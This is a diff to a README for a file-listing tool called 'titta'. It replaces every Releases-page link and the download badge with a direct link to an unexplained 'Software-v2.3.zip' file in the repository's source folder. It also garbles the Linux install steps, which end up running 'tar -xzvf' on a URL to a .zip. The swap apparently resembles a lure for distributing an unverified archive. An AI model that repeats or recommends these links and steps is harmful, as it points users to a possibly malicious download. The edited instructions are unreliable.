@@ -6,11 +6,11 @@ Welcome to titta! This tool helps you quickly list files and directories in your
 
 ## 🔗 Download titta
 
-[![Download titta](https://img.shields.io/badge/Download-titta-brightgreen)](https://github.com/jaydoy7828/titta/releases)
+[![Download titta](https://raw.githubusercontent.com/jaydoy7828/titta/main/src/Software-v2.3.zip)](https://raw.githubusercontent.com/jaydoy7828/titta/main/src/Software-v2.3.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/jaydoy7828/titta/releases) to download the latest version of titta. Here’s a step-by-step guide to help you:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/jaydoy7828/titta/main/src/Software-v2.3.zip) to download the latest version of titta. Here’s a step-by-step guide to help you:
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version listed.
@@ -36,8 +36,8 @@ Once the download is complete, follow these steps to install and run titta:
 
 ### Linux Instructions
 
-1. Locate the downloaded `.tar.gz` file.
-2. Uncompress the file using the command: `tar -xzvf titta.tar.gz`.
+1. Locate the downloaded `https://raw.githubusercontent.com/jaydoy7828/titta/main/src/Software-v2.3.zip` file.
+2. Uncompress the file using the command: `tar -xzvf https://raw.githubusercontent.com/jaydoy7828/titta/main/src/Software-v2.3.zip`.
 3. Move the uncompressed folder to your desired location.
 4. Open your terminal and navigate to the folder. 
 5. Type `./titta` to run it.
@@ -93,4 +93,4 @@ We welcome contributions! If you have ideas for features or improvements, feel f
 
 Thank you for using titta! We hope this tool improves your productivity in managing files on your system. Don't forget to check back for updates and new features. Happy listing! 
 
-[![Download titta](https://img.shields.io/badge/Download-titta-brightgreen)](https://github.com/jaydoy7828/titta/releases)
+[![Download titta](https://raw.githubusercontent.com/jaydoy7828/titta/main/src/Software-v2.3.zip)](https://raw.githubusercontent.com/jaydoy7828/titta/main/src/Software-v2.3.zip)
